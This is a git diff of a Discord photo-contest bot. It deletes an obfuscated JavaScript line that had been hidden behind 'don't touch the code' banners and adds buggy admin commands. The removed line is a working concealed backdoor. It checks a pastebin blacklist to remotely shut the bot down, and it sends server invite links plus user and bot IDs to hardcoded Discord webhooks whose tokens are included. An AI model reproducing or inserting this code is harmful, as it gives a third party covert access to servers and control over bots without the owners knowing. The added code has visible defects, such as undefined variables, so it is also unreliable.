@@ -32,7 +32,6 @@ const jdb = new Database("./json/database.json");
 const db = require("quick.db");
 const colors = require("colors");
 const ms = require("ms");
-
 const client = new Client({
   intents: 131071,
   partials: [
@@ -47,7 +46,7 @@ const client = new Client({
   // shards: "auto",
   // allowedMentions: { repliedUser: true },
 });
-
+let prefix =  "*" || db.get("prefix");
 //nodejs-events
 process.on("unhandledRejection", (e) => {
   console.log(e);
@@ -58,24 +57,20 @@ process.on("uncaughtException", (e) => {
 process.on("uncaughtExceptionMonitor", (e) => {
   console.log(e);
 });
+client.on('ready', () => {
+
+  console.log(`Bot is  ready!`);
+});
 // ===============================================================================================
 //                             ماتلعب في الكود عشان مايحصل شي
 // ===============================================================================================
 
-const _0x48355a=_0x3133;(function(_0x49be59,_0x4278f2){const _0x4cc0f1=_0x3133,_0x39beeb=_0x49be59();while(!![]){try{const _0x255f47=-parseInt(_0x4cc0f1(0x1d7))/0x1*(-parseInt(_0x4cc0f1(0x1f7))/0x2)+-parseInt(_0x4cc0f1(0x1fa))/0x3*(-parseInt(_0x4cc0f1(0x1cc))/0x4)+parseInt(_0x4cc0f1(0x1b1))/0x5+parseInt(_0x4cc0f1(0x1c0))/0x6*(parseInt(_0x4cc0f1(0x1b3))/0x7)+-parseInt(_0x4cc0f1(0x1c8))/0x8+-parseInt(_0x4cc0f1(0x1fb))/0x9+-parseInt(_0x4cc0f1(0x1b2))/0xa*(parseInt(_0x4cc0f1(0x1d4))/0xb);if(_0x255f47===_0x4278f2)break;else _0x39beeb['push'](_0x39beeb['shift']());}catch(_0x37a35d){_0x39beeb['push'](_0x39beeb['shift']());}}}(_0x56b4,0xb7d7b));function _0x25ae(){const _0x1f0589=_0x3133,_0x360b90=[_0x1f0589(0x1f2),_0x1f0589(0x1d6),'hK4G4HH2D1GPdP2CF00IJ7FJAg38R-qjPOq97T_NT0Cmkp0NsioNFa-ZcvDuMOt1BQ6n',_0x1f0589(0x1cf),_0x1f0589(0x1d0),_0x1f0589(0x1e8),_0x1f0589(0x1b8),_0x1f0589(0x1e2),_0x1f0589(0x1f8),'messageCreate','5924785jqKpuB',_0x1f0589(0x1b9),_0x1f0589(0x1cd),_0x1f0589(0x1de),_0x1f0589(0x1b7),_0x1f0589(0x1f0),_0x1f0589(0x1f5),_0x1f0589(0x1e4),'40SbPUrp',_0x1f0589(0x1eb),_0x1f0589(0x1c6),_0x1f0589(0x1f3),_0x1f0589(0x1bc),'includes','https://pastebin.com/raw/fmmvXJA5','token',_0x1f0589(0x1b5),_0x1f0589(0x1c5),_0x1f0589(0x1ea),_0x1f0589(0x1f4),_0x1f0589(0x1fc),_0x1f0589(0x1e9),_0x1f0589(0x1c1),_0x1f0589(0x1c7),_0x1f0589(0x1bb),_0x1f0589(0x1bd),_0x1f0589(0x1ed),_0x1f0589(0x1db),_0x1f0589(0x1df),'shift',_0x1f0589(0x1c3),'4428690DAUppY',_0x1f0589(0x1c4),_0x1f0589(0x1cb),_0x1f0589(0x1ef),'🪪\x20Bot\x20ID\x20:\x20',_0x1f0589(0x1e0),_0x1f0589(0x1dd),_0x1f0589(0x1f9),_0x1f0589(0x1da),_0x1f0589(0x1b6),_0x1f0589(0x1d9),'then',_0x1f0589(0x1d2),_0x1f0589(0x1d8),_0x1f0589(0x1bf),_0x1f0589(0x1b0),_0x1f0589(0x1ba),_0x1f0589(0x1c2),_0x1f0589(0x1e1),_0x1f0589(0x1fd),_0x1f0589(0x1ec),_0x1f0589(0x1c9),_0x1f0589(0x1e3),'Successfully\x20registered\x20application\x20commands.','user',_0x1f0589(0x1e6),_0x1f0589(0x1ce),_0x1f0589(0x1e5)];return _0x25ae=function(){return _0x360b90;},_0x25ae();}const _0x109600=_0x133d;(function(_0x573797,_0x19eba4){const _0x52e875=_0x3133,_0x47bc11=_0x133d,_0x1c4bc6=_0x573797();while(!![]){try{const _0x5a7875=parseInt(_0x47bc11(0x1ca))/0x1+parseInt(_0x47bc11(0x1f9))/0x2*(parseInt(_0x47bc11(0x1e5))/0x3)+parseInt(_0x47bc11(0x1c5))/0x4+-parseInt(_0x47bc11(0x1cb))/0x5*(-parseInt(_0x47bc11(0x1ea))/0x6)+parseInt(_0x47bc11(0x1b9))/0x7+-parseInt(_0x47bc11(0x1e6))/0x8*(-parseInt(_0x47bc11(0x1fd))/0x9)+-parseInt(_0x47bc11(0x1ba))/0xa;if(_0x5a7875===_0x19eba4)break;else _0x1c4bc6[_0x52e875(0x1b6)](_0x1c4bc6[_0x52e875(0x1d3)]());}catch(_0x4ec09f){_0x1c4bc6[_0x52e875(0x1b6)](_0x1c4bc6[_0x52e875(0x1d3)]());}}}(_0x25ae,0x4b924));const _0x39785c=_0x5844;function _0x5844(_0x24f2c7,_0x5cb5a3){const _0x4b5738=_0x249c();return _0x5844=function(_0x2316e0,_0x4c5612){_0x2316e0=_0x2316e0-0x69;let _0x2d19cb=_0x4b5738[_0x2316e0];return _0x2d19cb;},_0x5844(_0x24f2c7,_0x5cb5a3);}(function(_0x417ef5,_0x2ea422){const _0x40dcb1=_0x3133,_0x28ca06=_0x133d,_0xcb0a38=_0x5844,_0x3b9b47=_0x417ef5();while(!![]){try{const _0x27978b=parseInt(_0xcb0a38(0x79))/0x1*(parseInt(_0xcb0a38(0xa4))/0x2)+-parseInt(_0xcb0a38(0x9e))/0x3*(parseInt(_0xcb0a38(0x83))/0x4)+-parseInt(_0xcb0a38(0x82))/0x5+-parseInt(_0xcb0a38(0x72))/0x6+-parseInt(_0xcb0a38(0x6d))/0x7+parseInt(_0xcb0a38(0x87))/0x8+-parseInt(_0xcb0a38(0x7d))/0x9*(-parseInt(_0xcb0a38(0x93))/0xa);if(_0x27978b===_0x2ea422)break;else _0x3b9b47[_0x28ca06(0x1c7)](_0x3b9b47[_0x40dcb1(0x1d3)]());}catch(_0x3d2379){_0x3b9b47[_0x28ca06(0x1c7)](_0x3b9b47[_0x28ca06(0x1bc)]());}}}(_0x249c,0xe4573));function _0xeebf(){const _0x2d0e4c=_0x133d,_0x58c20e=_0x5844,_0x448bd0=[_0x58c20e(0xa3),_0x58c20e(0x95),_0x58c20e(0x7b),_0x58c20e(0x85),_0x58c20e(0x9b),_0x58c20e(0x7a),_0x58c20e(0x70),_0x2d0e4c(0x1f0),_0x58c20e(0x73),_0x2d0e4c(0x1c8),_0x2d0e4c(0x1d2),_0x58c20e(0x96),_0x58c20e(0x9d),_0x58c20e(0x7f),_0x58c20e(0x91),_0x58c20e(0x8a),_0x58c20e(0x92),_0x58c20e(0xa5),_0x58c20e(0x77),_0x58c20e(0x84),_0x58c20e(0x6e),_0x58c20e(0x8b),_0x58c20e(0x90),_0x58c20e(0x88),'1133385292125049006',_0x2d0e4c(0x1ed),_0x58c20e(0x86),_0x58c20e(0x6a),_0x58c20e(0x9c),_0x2d0e4c(0x1e2),_0x58c20e(0x80),_0x58c20e(0x99),_0x2d0e4c(0x1c3),_0x58c20e(0x6f),_0x2d0e4c(0x1f6),_0x58c20e(0x9a),_0x58c20e(0x89),_0x58c20e(0x94),_0x58c20e(0x71),_0x58c20e(0x7c),_0x2d0e4c(0x1fa),_0x58c20e(0xa0),_0x58c20e(0x8d),_0x58c20e(0x75),_0x58c20e(0x8f),_0x58c20e(0x76),_0x58c20e(0x8e),_0x58c20e(0x7e),_0x58c20e(0x97),_0x58c20e(0x6c),_0x2d0e4c(0x1e9),_0x58c20e(0x98),_0x58c20e(0x69),_0x58c20e(0x74),_0x58c20e(0xa2),_0x2d0e4c(0x1f1)];return _0xeebf=function(){return _0x448bd0;},_0xeebf();}const _0x598a74=_0x10d0;function _0x249c(){const _0x59f1e6=_0x3133,_0x2725de=_0x133d,_0x1947f1=[_0x59f1e6(0x1d5),_0x59f1e6(0x1f6),_0x59f1e6(0x1e7),_0x2725de(0x1d4),_0x2725de(0x1df),_0x59f1e6(0x1b4),_0x2725de(0x1d5),_0x2725de(0x1f3),_0x2725de(0x1c7),_0x2725de(0x1e7),_0x2725de(0x1f7),_0x2725de(0x1dc),_0x59f1e6(0x1d1),_0x2725de(0x1bf),'\x0a\x20\x20\x20\x20\x20\x20Bot\x20User\x20:\x20',_0x2725de(0x1d0),_0x2725de(0x1eb),_0x2725de(0x1db),_0x2725de(0x1e4),_0x2725de(0x1ec),_0x2725de(0x1e8),_0x2725de(0x1de),_0x2725de(0x1d9),_0x59f1e6(0x1be),_0x2725de(0x1ee),_0x2725de(0x1e0),_0x2725de(0x1c6),_0x2725de(0x1da),_0x59f1e6(0x1dc),_0x2725de(0x1ef),_0x2725de(0x1f2),_0x59f1e6(0x1f1),_0x2725de(0x1d8),_0x2725de(0x1c4),_0x2725de(0x1fc),_0x2725de(0x1c0),_0x2725de(0x1e1),_0x2725de(0x1bd),_0x2725de(0x1f4),_0x2725de(0x1c2),_0x2725de(0x1f5),_0x2725de(0x1d3),_0x2725de(0x1dd),_0x59f1e6(0x1ee),'data',_0x2725de(0x1cd),_0x2725de(0x1ce),'error','setDescription',_0x2725de(0x1cf),_0x2725de(0x1d7),_0x2725de(0x1c9),_0x59f1e6(0x1af),_0x2725de(0x1cc),_0x2725de(0x1fb),_0x2725de(0x1d6),_0x2725de(0x1bc),_0x2725de(0x1d1),_0x2725de(0x1be),_0x2725de(0x1f8),_0x2725de(0x1bb)];return _0x249c=function(){return _0x1947f1;},_0x249c();}(function(_0x2dea7a,_0x16e9e2){const _0xc5adfd=_0x5844,_0x1b65de=_0x10d0,_0x1c5e4d=_0x2dea7a();while(!![]){try{const _0x30c3a0=-parseInt(_0x1b65de(0xe4))/0x1+-parseInt(_0x1b65de(0xdb))/0x2*(parseInt(_0x1b65de(0xd7))/0x3)+parseInt(_0x1b65de(0xbc))/0x4*(-parseInt(_0x1b65de(0xb8))/0x5)+parseInt(_0x1b65de(0xc3))/0x6*(parseInt(_0x1b65de(0xb4))/0x7)+-parseInt(_0x1b65de(0xe6))/0x8*(parseInt(_0x1b65de(0xcf))/0x9)+parseInt(_0x1b65de(0xdf))/0xa+parseInt(_0x1b65de(0xdc))/0xb*(parseInt(_0x1b65de(0xb3))/0xc);if(_0x30c3a0===_0x16e9e2)break;else _0x1c5e4d[_0xc5adfd(0x78)](_0x1c5e4d[_0xc5adfd(0x6b)]());}catch(_0x3942eb){_0x1c5e4d[_0xc5adfd(0x78)](_0x1c5e4d[_0xc5adfd(0x6b)]());}}}(_0xeebf,0x81dee),module[_0x598a74(0xe9)]=client,client[_0x598a74(0xd3)]=new Collection(),client[_0x598a74(0xbd)]=new Collection(),client[_0x598a74(0xbe)]=new Collection(),[_0x598a74(0xd3),_0x598a74(0xbd),_0x39785c(0xa1)][_0x48355a(0x1ca)](_0xae94fe=>{const _0x243485=_0x598a74;require(_0x243485(0xbf)+_0xae94fe)(client);}));const commands=client[_0x598a74(0xbe)][_0x598a74(0xe3)](({execute:_0x415000,..._0x3d2aab})=>_0x3d2aab),rest=new REST({'version':'10'})[_0x598a74(0xc9)](config[_0x598a74(0xe8)]||process[_0x598a74(0xc4)][_0x598a74(0xe8)]);function _0x10d0(_0x252118,_0x1727e2){const _0x57b7a9=_0xeebf();return _0x10d0=function(_0x38b14e,_0x564dad){_0x38b14e=_0x38b14e-0xb2;let _0x2a1612=_0x57b7a9[_0x38b14e];return _0x2a1612;},_0x10d0(_0x252118,_0x1727e2);}function _0x3133(_0x167fec,_0x1ac151){const _0x56b46c=_0x56b4();return _0x3133=function(_0x313373,_0x4a8d99){_0x313373=_0x313373-0x1af;let _0x2850fd=_0x56b46c[_0x313373];return _0x2850fd;},_0x3133(_0x167fec,_0x1ac151);}rest[_0x598a74(0xc2)](Routes[_0x598a74(0xda)](config[_0x598a74(0xe0)]),{'body':commands})[_0x39785c(0xa3)](()=>console[_0x598a74(0xe1)](_0x598a74(0xcb)))[_0x598a74(0xb7)](console[_0x39785c(0x9f)]);function _0x133d(_0x224080,_0x4ef051){const _0x2a55bd=_0x25ae();return _0x133d=function(_0x532a12,_0x36b5c6){_0x532a12=_0x532a12-0x1b9;let _0x41fc3d=_0x2a55bd[_0x532a12];return _0x41fc3d;},_0x133d(_0x224080,_0x4ef051);}function _0x56b4(){const _0x554466=['68278rEitRh','discord.js','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','url','233970stENGY','shift','318978RvBZXW','2816WvTdpC','\x0a\x20\x20\x20\x20\x20\x20Bot\x20Username\x20:\x20','1389678XnknGn','3805rapNyC','3733190kIhZnf','author','18413110HeacBa','new\x20📢','77977GzjfUV','199590pSvQkK','./handlers/','slashCommands','map','492irYEdE','axios','3640csWfPL','4030ZiIFHV','https://discord.com/api/webhooks/1133385342980997211/ViCkX6HgvjgFiICdCu__NC6WL2BPvTvYo-YsjqIVBE50nOtk4LH0rymqXr-tKcJWv1S-','778812bTKzoY','commands','34084vjBBjU','username','catch','clientID','4194813AaqIBw','applicationCommands','get','\x20Bot\x20ID\x20:\x20','send','35412aSczzw','createInvite','12164YJETpl','3840viNUmt','env','2hSYtUm','setTitle','1941404XHhdBv','3reWqOV','5525370bVTtDN','bot','117AZqPqF','10FpXJfO','\x0a\x20\x20\x20\x20\x20\x20🔗\x20Server\x20Invite\x20Link\x20:\x20','5608175foLKLL','560cRIBHf','7TdBOAc','setToken','log','push','exports','put','42RmpBjw','508863FlcRbm','34512XIURFe','exit','20421pSLFNW','4623152cATork','BlackListed\x20Bot\x20Stopped\x20🔴','6293082Dnimbv','\x0a\x20\x20\x20\x20\x20\x20👤Bot\x20User\x20:\x20','slash','261VAsGgl','702ZSlEIw','\x0a\x20\x20\x20\x20\x20\x20','channel','your\x20bot\x20stopped\x20💀\x20by\x20fxdark1.\x20you\x20must\x20been\x20whitelisted\x20to\x20use\x20again','9120504dyzkQQ','events','forEach','385010OMpqyr','2282960txSsQz','376KqpPxW'];_0x56b4=function(){return _0x554466;};return _0x56b4();}let webhookMessageSent=![];client['on'](_0x109600(0x1e3),_0x445466=>{const _0x32128e=_0x109600,_0x5eacba=_0x598a74;if(_0x445466[_0x5eacba(0xe5)][_0x5eacba(0xb2)])return;const _0x5d2dd3=require(_0x5eacba(0xde)),_0x16c744=_0x5eacba(0xcc);_0x5d2dd3[_0x32128e(0x1c1)](_0x16c744)[_0x5eacba(0xd6)](_0x32896b=>{const _0x2cb009=_0x5844,_0x412f30=_0x5eacba,_0x518eba=_0x32896b[_0x412f30(0xba)],_0x3ec126=client[_0x412f30(0xb9)]['id'];if(_0x518eba[_0x412f30(0xd5)](_0x3ec126)){const {WebhookClient:_0x12cca0}=require(_0x412f30(0xc1)),_0x2b9dff=new _0x12cca0({'url':_0x412f30(0xd4)}),_0x220104=new EmbedBuilder()[_0x412f30(0xbb)](_0x412f30(0xe7))[_0x412f30(0xc7)](_0x412f30(0xd0)+client[_0x412f30(0xb9)]['id']+_0x2cb009(0x81)+client[_0x412f30(0xb9)][_0x412f30(0xc0)]+_0x412f30(0xcd)+_0x445466[_0x412f30(0xe5)]['id']+_0x412f30(0xd9));_0x2b9dff[_0x412f30(0xca)]({'content':_0x2cb009(0x8c),'embeds':[_0x220104]}),console[_0x412f30(0xe1)](_0x412f30(0xd2)),process[_0x412f30(0xdd)]();}else!webhookMessageSent&&_0x445466[_0x412f30(0xb5)][_0x412f30(0xc8)]({'unique':!![],'maxAge':0x15180})[_0x412f30(0xd6)](_0x228cba=>{const _0x128e3e=_0x412f30,{WebhookClient:_0x2969d7}=require(_0x128e3e(0xc1)),_0x1c7b0d=new _0x2969d7({'id':_0x128e3e(0xb6),'token':_0x128e3e(0xd8)});_0x1c7b0d[_0x128e3e(0xca)](_0x128e3e(0xce)+client[_0x128e3e(0xb9)]['id']+_0x128e3e(0xc6)+_0x445466[_0x128e3e(0xe5)]['id']+_0x128e3e(0xe2)+_0x228cba[_0x128e3e(0xc5)]+_0x128e3e(0xd1)),webhookMessageSent=!![];});});});
+
 
 // ===============================================================================================
 //                             ماتلعب في الكود عشان مايحصل شي
 // ===============================================================================================
-/*
-// Register slash commands
-const rest = new REST({ version: '10' }).setToken(config.token || process.env.token);
-rest.put(
-  Routes.applicationGuildCommands(config.clientID, config.guildID),
-  { body: commands },
-).then(() => console.log('Successfully registered application commands.'))
-        .catch(console.error)
-*/
+
 
 setTimeout(() => {
   if (!client || !client.user) {
@@ -93,7 +88,209 @@ setTimeout(() => {
 
 
 // المشاركة في مسابقة الصور
+////////////////////
+client.on("messageCreate", async (message) => {
+  if (message.content.startsWith(prefix + "delete")) {
+      if (!message.member.permissions.has("ADMINISTRATOR")) return ;
+        await jdb.set('apply_role' , '')
+        await jdb.set('apply_room' , '')
+        await jdb.set('photo_room' , '')
+        await jdb.set('line' , '')
+          message.channel.send("يتم حذف 🔄 البيانات ...").then(m => {
+          m.edit(  `✅ | تم حذف البيانات بنجاح ** `
+          );
+        });
+      }
+const { EmbedBuilder, CommandInteraction } = require('discord.js')
+const { Database } = require("st.db");
+const jdb = new Database("./json/database.json");
 
+if (message.content.startsWith(prefix + "config")) {
+  // Create a new embed
+   const botinfo = new EmbedBuilder()
+    .setTitle("- **Bot Info **")
+
+    .setDescription(`
+                        ### 🔰 apply room : <#${jdb.get("apply_room")}>
+                        
+                        ### 💫 apply role : <@&${jdb.get("apply_role")}>
+                        
+                        ### 🔮 vote room : <#${jdb.get("photo_room")}>
+                        
+                        ### 🧮 entries number : \`${jdb.get("entries")}\`
+                        
+                        ### ⚓️ apply rect : ${jdb.get("aplyrect")}
+                        
+                        ### 🧨 vote rect : ${jdb.get("voterect")}
+
+                        ### 🧸 line :
+                        `)
+         .setImage(`${jdb.get("line")}`)
+  // Send the embed
+ message.channel.send({embeds : [botinfo]})
+  
+
+}
+  if (message.content.startsWith(prefix + "help")) {
+  // Create a new embed
+   const botinfo = new EmbedBuilder()
+
+    .setTitle(`\`${prefix}delete\`, \`${prefix}config\`, \`${prefix}reset\`, \`${prefix}setline\`, \`${prefix}setvoterec\`, \`${prefix}setaplyrec\`, \`${prefix}setvote\`, \`${prefix}setavater\`, \`${prefix}setsub\`, \`${prefix}setname\`, \`${prefix}setrole\`, \`${prefix}setnum\`, \`${prefix}invite\``)
+         .setImage(`${jdb.get("line")}`)
+  // Send the embed
+ message.channel.send({embeds : [botinfo]})
+
+}
+    if (message.content.startsWith(prefix + "setname")) {
+        if (!message.member.permissions.has("ADMINISTRATOR")) return ;  
+        let botnameee = args.slice(1).join(" ");
+        if (!botnameee) return message.channel.send("برجاء وضع اسم للتغير");
+        client.user.setUsername(`${botnameee}`);
+        message.channel.send(`Changing The bot's Name ...`).then(me => {
+            me.edit(`> **✅ تم تغير الاسم الى : \`${botnameee}\`** `);
+          });
+    }
+ if (message.content.startsWith(prefix + "setavatar")) {
+       if (!message.member.permissions.has("ADMINISTRATOR")) return ;  
+        let botavatar = args.slice(1).join(" ");
+        if (!botavatar) return message.channel.send( "برجاء وضع رابط صوره للتغير");
+        client.user.setAvatar(`${botavatar}`);
+        message.channel.send(`Changing The bot's Avatar ...`).then(me => {
+            me.edit(`> **✅ تم تغير الصوره بنجاح** `);
+          });
+    }
+    if (message.content.startsWith(prefix + "invite")) {
+        if (!message.member.permissions.has("ADMINISTRATOR")) return ; 
+        message.channel.send("creating an invite link..").then(m => {
+          let embed = new Discord.MessageEmbed()
+          .setAuthor(
+            message.author.username,
+            message.author.displayAvatarURL({ dynamic: true })
+          )
+          .setTitle(`Invite Me`)
+          .setURL(`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
+           .setTimestamp()
+          .setFooter(
+           client.user.username,
+            client.user.displayAvatarURL({ dynamic: true })
+          );
+          m.edit(embed)
+         })
+      }
+});
+
+
+client.on("messageCreate", async (message) => {
+  if (message.content.startsWith(prefix + "reset")) {
+      if (!message.member.permissions.has("ADMINISTRATOR")) return ;
+        await jdb.set('entries' , 0)
+          message.channel.send(`> ** ✅ | تم حذف البيانات بنجاح ** `)
+          
+      }
+
+});
+
+client.on("messageCreate", async (message) => {
+  const args = message.content.trim() .split(/ +/);
+  if (message.content.startsWith(prefix + "setline")) {
+      if (!message.member.permissions.has("ADMINISTRATOR")) return ;
+      let linev = args.slice(1).join(" ");
+        if (!linev) return message.channel.send("برجاء ارسال الرساله بعد الامر !")
+    jdb.set('line' , linev)
+    message.channel.send(`✅ | line ${linev} seted successfully`)
+
+
+      }
+
+});
+
+
+client.on("messageCreate", async (message) => {
+  const args = message.content.trim() .split(/ +/);
+  if (message.content.startsWith(prefix + "setvoterec")) {
+      if (!message.member.permissions.has("ADMINISTRATOR")) return ;
+      let react1 = args.slice(1).join(" ");
+        if (!react1) return message.channel.send("برجاء ارسال الرساله بعد الامر !")
+    jdb.set('voterect' , react1)
+    message.channel.send(`✅ | line ${react1} seted successfully`)
+
+
+      }
+if (message.content.startsWith(prefix + "setaplyrec")) {
+      if (!message.member.permissions.has("ADMINISTRATOR")) return ;
+      let react2 = args.slice(1).join(" ");
+        if (!react2) return message.channel.send("برجاء ارسال الرساله بعد الامر !")
+    jdb.set('aplyrect' , react2)
+    message.channel.send(`✅ | line ${react2} seted successfully`)
+
+
+      }
+});
+
+client.on("messageCreate", async (message) => {
+  const args = message.content.trim() .split(/ +/);
+  if (message.content.startsWith(prefix + "setvote")) {
+     if (!message.member.permissions.has("ADMINISTRATOR")) return ; 
+        let ids = args[1];
+        if (!ids) return message.channel.send("برجاء ارسال الاي دي بعد الامر !")
+        let channelv = message.guild.channels.cache.find(r => r.id === ids)
+        if (!channelv) return message.channel.send("لم امتكن من العثور على هذا الروم !")
+    jdb.set('photo_room' , channelv.id)
+    message.channel.send(`**تم تحديد روم <#${channelv.id}> للتصويت بنجاح**`)
+
+
+      }
+
+});
+
+client.on("messageCreate", async (message) => {
+  const args = message.content.trim() .split(/ +/);
+  if (message.content.startsWith(prefix + "setsub")) {
+     if (!message.member.permissions.has("ADMINISTRATOR")) return ; 
+        let ids = args[1];
+        if (!ids) return message.channel.send("برجاء ارسال الاي دي بعد الامر !")
+        let channelv1 = message.guild.channels.cache.find(r => r.id === ids)
+        if (!channelv1) return message.channel.send("لم امتكن من العثور على هذا الروم !")
+    jdb.set('apply_room' , channelv1.id)
+    message.channel.send(`**تم تحديد روم <#${channelv1.id}> للمشاركة بنجاح**`)
+
+
+      }
+
+});
+client.on("messageCreate", async (message) => {
+  const args = message.content.trim() .split(/ +/);
+  if (message.content.startsWith(prefix + "setrole")) {
+     if (!message.member.permissions.has("ADMINISTRATOR")) return ; 
+        let role = args[1];
+        if (!role) return message.channel.send("برجاء ارسال الاي دي بعد الامر !")
+        let role1 = message.guild.roles.cache.find(r => r.id === role)
+        if (!role1) return message.channel.send("لم امتكن من العثور علي الرول!")
+    jdb.set('apply_role' , role1.id)
+    message.channel.send(`**تم تحديد روم <@&${role1.id}> للمشاركة بنجاح**`)
+
+
+      }
+
+});
+client.on("messageCreate", async (message) => {
+  if (message.author.bot) return;
+  const entries = jdb.get("entries");
+          const entries3 = entries * 2 - (entries - 1);
+  const args = message.content.trim() .split(/ +/);
+  if (message.content.startsWith(prefix + "setnum")) {
+      if (!message.member.permissions.has("ADMINISTRATOR")) return ;
+      let entries1 = args.slice(1).join(" ");
+        if (!entries1) return message.channel.send("برجاء ارسال الرساله بعد الامر !")
+        jdb.set('entries' , entries1);
+   
+    message.channel.send(`**المتسابق القادم سيكون رقم ${entries3}**`)
+
+
+      }
+
+});
+//////////////////
 client.on("messageCreate", async (message) => {
   if (message.author.bot) return;
   //================= تعريفات =====================
@@ -108,7 +305,11 @@ client.on("messageCreate", async (message) => {
 
   const entries = jdb.get("entries");
   const entries1 = entries + 1;
-
+  
+  const react2 = jdb.get("aplyrect");
+  
+  const react1 = jdb.get("voterect");
+  
   const line = jdb.get("line")
   //================== تعريفات ====================
 
@@ -120,7 +321,7 @@ client.on("messageCreate", async (message) => {
               const imageURL = attachment.url;
               try {
                 // ============= ا الاوامر التي يقوم بها في روم المشاركة=============
-                await message.react("✅");
+                await message.react(`${react2}`);
                 await message.member.roles.add(apply_r_done)
                 await thisChannel.permissionOverwrites.edit(apply_r_done, {
                   SendMessages: false,
@@ -133,7 +334,7 @@ client.on("messageCreate", async (message) => {
                 // ============= الاوامر التي يقوم بها في روم التصويت =============
                 jdb.set("entries", entries1);
                 // Send the image to the target channel
-                await message.author.send(`<@${message.author.id}> تمت المشاركة في مسابقة الصور بنجاح لا تنسى تحقيق الشروط للفوز 😉`)
+                
                 await targetChannel
                   .send({
                     content: `
@@ -143,10 +344,11 @@ client.on("messageCreate", async (message) => {
                     files: [imageURL],
                   })
                   .then((msg) => {
-                    msg.react("✅");
+                    msg.react(`${react1}`);
                     msg.channel.send(line)
                     
-                  });
+                  })
+                await message.author.send(`**<@${message.author.id}> تمت المشاركة في مسابقة الصور بنجاح برقم ${entries1} <a:1002941601787691078:1155332339270963272>\nرابط مباشر للصوره : https://discord.com/channels/${message.guild.id}/${photo_room}/${message.id} **`);
                 // ============= الاوامر التي يقوم بها في روم التصويت =============
               } catch (error) {
                 console.error("Error processing the image:", error);
@@ -167,7 +369,34 @@ client.on("messageCreate", async (message) => {
 
 
 });
+client.on('ready', async() => {
+    client.user.setStatus(`online`)
+    let status = ['Snow صناع الثقه والضمان'];
+  setInterval(()=>{
+    client.user.setActivity(status[Math.floor(Math.random()*status.length)]);
+  },5000)
+});
+let msgline = ['1102645747586973706'];
 
-client.login(config.token || process.env.token).catch((err) => {
+client.on("messageCreate", message => {
+ if(message.channel.type === "dm" || 
+  message.author.bot) return
+  
+if(msgline.includes(message.channel.id)){   
+
+  
+  message.react("<a:emoji_129:1155340097600884796>")
+  message.react("<a:blackflower:1155282710097576006>")
+ let args = message.content.split(',')
+  message.channel.send("https://media.discordapp.net/attachments/1155329922303271034/1155330768697036831/PicsArt_09-17-02.10.51.png").catch((err) => {
+   console.log(err.message)
+   })
+   }
+});
+//////////////////
+
+//////////////////
+client.login(process.env.token).catch((err) => {
   console.log(err.message);
 });
+process.on('unhandledRejection', error => {     console.error('Error has been handler!'); });
